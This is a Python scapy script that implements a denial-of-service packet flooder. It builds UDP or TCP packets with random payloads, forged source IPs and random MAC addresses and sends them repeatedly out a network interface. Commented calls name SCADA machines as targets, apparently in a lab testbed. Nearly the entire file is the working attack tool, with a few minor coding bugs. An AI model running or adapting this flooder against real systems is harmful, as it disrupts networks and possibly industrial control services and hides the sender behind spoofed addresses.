from dos_header import machines
from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, TCP, UDP, ICMP, icmptypes
from scapy.data import ETHER_TYPES
import random
import argparse

# Default parameters
PKT_MAX_LEN = 1460
DEFAULT_CNT = 10
DEFAULT_INTER = 0.01

class DOSAttack:
    def __init__(self):
        pass
    
    def rand_mac(self):
        return "%02x:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255))

    def random_port(self):
        return random.randint(1, 65535)
    
    def create_attack_pkts(self, src_list, target_list, pkt_len, inter = DEFAULT_INTER, cnt = DEFAULT_INTER):
        # By default ether type is ipv4
        
        pkt_lst = []
        for target_name in target_list:
            for src_name in src_list:
                
                load = os.urandom(pkt_len)
                pkt = Ether(dst=machines[target_name]['mac'], 
                            src=machines[src_name]['mac'],
                            type=ETHER_TYPES['IPv4'])/\
                      IP(dst=machines[target_name]['ip'],
                         src=machines[src_name]['ip'],)/\
                      UDP(dport=machines[target_name]['port'],
                          sport=machines[src_name]['port'])/\
                      Raw(load=load)
                print(len(load))
                pkt.show2()
                pkt_lst.append(pkt)
        
        # return pkt_lst
        sendp(pkt_lst, iface="eth2", count=cnt, inter=inter)
    
    def start_dos_attack(pkt_lst, cnt = 100, inter = 0.01):
        sendp(pkt_lst, iface="eth2", count=cnt, inter=inter)
    
    def create_ip_pkts(self, src_ip=None, dst_ip=None, tran_l_proto="UDP", pkt_len=None, src_port=None, dst_port=None, cnt=100, inter=0.01):
        
        # If src_ip is named in 'machines', use its corresponding ip and mac addr
        # Else if src_ip written in octet format, use it and random mac addr
        # Else randomly select from machnes given along with mac
        
        #--------------------------------------
        # SRC IP, MAC, PORT
        #--------------------------------------
        if src_ip == None:
            # Select key at random
            machine_name = random.choice(list(machines.keys()))
            src = machines[machine_name]['ip']
            # Select random mac
            src_mac = self.rand_mac()
            
        elif src_ip in machines:
            src = machines[src_ip]['ip']
            src_mac = machines[src_ip]['mac']
            if src_port == None:
                src_port = machines[src_ip]['port']
        
        else:
            # Custom IP
            src = src_ip
            # Random mac
            src_mac = self.rand_mac()
        
        if src_port == None:
            src_port = self.random_port()
        else:
            src_port = int(src_port)
            
        print(src, src_mac, src_port)

        #--------------------------------------
        # DST IP, MAC, PORT
        #--------------------------------------
       
        if dst_ip == None:
            # Select key at random
            machine_name = random.choice(list(machines.keys()))
            dst = machines[machine_name]['ip']
            # Select random mac
            dst_mac = self.rand_mac()
            
        elif dst_ip in machines:
            dst = machines[dst_ip]['ip']
            dst_mac = machines[dst_ip]['mac']
            if dst_port == None:
                dst_port = machines[dst_ip]['port']
        
        else:
            # Custom IP
            dst = dst_ip
            # Random mac
            dst_mac = self.rand_mac()
        
        if dst_port == None:
            dst_port = self.random_port()
        else:
            dst_port = int(dst_port)
        print(dst, dst_mac, dst_port)
        
        #--------------------------------------
        # LENGTH, Protocol
        #--------------------------------------
        if pkt_len is None:
            pkt_len = random.randint(1, PKT_MAX_LEN)
        load = os.urandom(int(pkt_len))
        
        #--------------------------------------
        # Packet gerneration
        #--------------------------------------      
        pkt = None
        if tran_l_proto == "UDP":
            pkt = Ether(dst=dst_mac, 
                        src=src_mac,
                        type=ETHER_TYPES['IPv4'])/\
                  IP(dst=dst,
                     src=src,)/\
                  UDP(dport=dst_port,
                      sport=src_port)/\
                  Raw(load=load)
            #print(len(load))
            pkt.show2()
        
        else:
        # TCP
            pkt = Ether(dst=dst_mac, 
                        src=src_mac,
                        type=ETHER_TYPES['IPv4'])/\
                  IP(dst=dst,
                     src=src,)/\
                  TCP(dport=dst_port,
                      sport=src_port)/\
                  Raw(load=load)
            #print(len(load))
            pkt.show2()
        return pkt
    
    def launch_attack(self,pkts,inter):       
        inter = float(inter)
        sendp(pkts, iface="eth2", count=cnt, inter=inter)

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='DOS Attack')
    parser.add_argument('--src_ip', help="provide machine name/or IP addr", default = None)
    parser.add_argument('--dst_ip', help="provide machine name/or IP addr", default = None)
    parser.add_argument('--src_port', help="provide port number", default = None)
    parser.add_argument('--dst_port', help="provide port number", default = None)
    parser.add_argument('--len', help="provide len of raw load", default = None)
    parser.add_argument('--trans_proto', help="transport layer protocol UDP/TCP", default = None)
    parser.add_argument('--count', help="No of packets to send", default = DEFAULT_CNT)
    parser.add_argument('--interval', help="Interval between packets", default = DEFAULT_INTER)
 
    args = parser.parse_args() 

    attack = DOSAttack()
    cnt = int(args.count)
    pkts=[]
    # The scripts create cnt unique packets, each cnt times => (cnt)^2 packets are generated
    for i in range(cnt):
        pkt=attack.create_ip_pkts(src_ip = args.src_ip, dst_ip = args.dst_ip, src_port = args.src_port, dst_port = args.dst_port, tran_l_proto = args.trans_proto, pkt_len = args.len, inter = args.interval, cnt = args.count)
        pkts.append(pkt)
    attack.launch_attack(pkts,args.interval)

    # pkt = attack.create_attack_pkts(src_list=["mini3", "mini2"], target_list=["scada1", "scada2"], pkt_len=100, inter=1)

    # attack.create_ip_pkts(src_ip = "mini1", dst_ip= "12.32.21.12", src_port = 10023, dst_port = 456, tran_l_proto = "TCP", cnt=10)

